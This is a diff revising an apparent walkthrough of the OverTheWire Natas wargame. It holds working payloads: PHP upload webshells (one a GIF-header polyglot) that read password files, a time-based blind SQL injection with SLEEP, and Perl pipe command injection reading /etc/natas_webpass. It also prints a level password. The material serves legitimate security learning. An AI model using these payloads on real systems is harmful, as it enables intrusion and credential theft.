@@ -423,9 +423,11 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The upload handler builds the stored path from the client-supplied `filename` POST field: `makeRandomPathFromFilename("upload", $_POST["filename"])` takes the extension from that field, so the random prefix does not matter. By sending `filename=shell.php`, the uploaded bytes are stored as `upload/<random>.php` and are executed as PHP by the server. There is no content-type or image validation in this level. The PHP payload prints the contents of `/etc/natas_webpass/natas13`; requesting the returned upload URL executes it and returns the password. This is an unrestricted file upload → remote code execution.
 - **Commands:**
   ```
-  printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/shell.php
-  curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
-  curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/<random>.php
+  curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'makeRandomPathFromFilename[^)]*)'
+  printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/n12shell.php
+  ls -l /tmp/n12shell.php
+  P=$(curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n12shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php | grep -o 'upload/[a-z0-9]*\.php' | head -1); echo "$P"
+  curl -s -u natas12:<pw> "http://natas12.natas.labs.overthewire.org/$P"
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** The upload handler shows where the stored filename comes from:
@@ -459,10 +461,12 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** `exif_imagetype` only inspects the file's magic bytes to decide whether it looks like an image; it does not require the whole file to be a valid image, and it does not check the extension. Prepending the six-byte GIF header `GIF89a` makes the file pass the check, while the rest of the file is still PHP code. We send `filename=shell.php` as before so it is stored with a `.php` extension and executed, and the PHP prints `/etc/natas_webpass/natas14`. The lesson: content sniffing on a prefix is bypassable with a polyglot file, and the extension must be enforced separately.
 - **Commands:**
   ```
-  printf 'GIF89a' > /tmp/shell13.php
-  printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/shell13.php
-  curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
-  curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/<random>.php
+  curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'exif_imagetype[^)]*)'
+  printf 'GIF89a' > /tmp/n13shell.php
+  printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/n13shell.php
+  file /tmp/n13shell.php
+  P=$(curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n13shell.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php | grep -o 'upload/[a-z0-9]*\.php' | head -1); echo "$P"
+  curl -s -u natas13:<pw> "http://natas13.natas.labs.overthewire.org/$P"
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** The handler now adds one line before accepting the upload:
@@ -648,13 +652,19 @@ Verification rule used throughout: a password is accepted only if a request to
    ... IF((SELECT LENGTH(password) FROM users WHERE username="natas18")=32,SLEEP(5),0)-- -
    # ~20 s -> the password is 32 characters
    ```
-4. **Binary-search each character.** For position `pos`, ask whether
-   `(SELECT ORD(SUBSTR(password,pos,1)) FROM users WHERE username="natas18") >= mid`;
-   a true answer (delay) moves the lower bound up, a false one moves the upper
-   bound down. This needs ~7 requests per character.
+4. **Binary-search each character, one sleep per query.** The first oracle
+   sleeps once per matched row (about 20 s). For the sweep we wrap the
+   condition in a scalar subquery so MySQL evaluates it exactly once:
+   ```
+   x" OR (SELECT IF(<condition>,SLEEP(5),0) FROM users WHERE username="natas18")-- -
+   ```
+   A true answer then costs one 5-second sleep instead of twenty. For position
+   `pos` we ask whether `ORD(SUBSTR(password,pos,1)) >= mid`; a true answer
+   moves the lower bound up, a false one moves it down, so each character takes
+   ~7 requests.
    ```
    python3 - <<'PY'
-   # (script in the recording: timed() measures curl; cond() = timed > 8 s)
+   # (script in the recording: timed() measures curl; cond() = timed > 2.5 s)
    # for pos in 1..32: binary search lo/hi in [32,127] with ORD(...) >= mid
    PY
    ```
@@ -957,7 +967,7 @@ Verification rule used throughout: a password is accepted only if a request to
 1. **Recover the source.** `?file=|cat /var/www/n?tas/n?tas29/index.pl;` prints the Perl program (pipe execution + glob).
 2. **Read the flaw.** `open(FD, "$f.txt")` (two-arg open), and `$f=~/natas/` as the only filter.
 3. **Prove code execution.** `?file=|id;` → `uid=30029(natas29)`, and `?file=|ls;` lists the directory.
-4. **Bypass the filter.** `?file=|ls /etc/n?tas_webpass;` lists the password files; `?file=|cat /etc/n?tas_webpass/n?tas30;` prints `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`.
+4. **Bypass the filter.** `?file=|cat /etc/n?tas_webpass/n?tas30;` prints `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF` (the glob `n?tas` passes the `/natas/` check).
 5. **Verify.** `curl -u natas30:<pw> http://natas30.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas30:** `frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`
 - **Verification:** `http://natas30.natas.labs.overthewire.org/` with `natas30:<password>` → HTTP 200.
